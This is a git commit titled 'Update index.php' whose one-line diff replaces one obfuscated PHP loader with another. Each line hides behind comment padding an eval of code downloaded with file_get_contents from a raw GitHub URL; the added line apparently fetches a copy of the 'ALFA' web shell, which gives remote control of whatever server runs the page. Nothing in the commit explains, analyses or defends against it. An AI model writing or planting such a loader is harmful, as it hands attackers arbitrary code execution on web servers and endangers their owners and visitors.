fdd36fe7188a311f8f7efe9bd237015531107aa5
Denizly Furqan <31403046+zycoder0day@users.noreply.github.com>
2023-02-22 12:06:40 +0000

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/raminfp/DeObfuscation_ALFA_SHELL_V3/master/final_alfashell.php"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/zycoder0day/alfa/main/alf2.php"));/**/?>
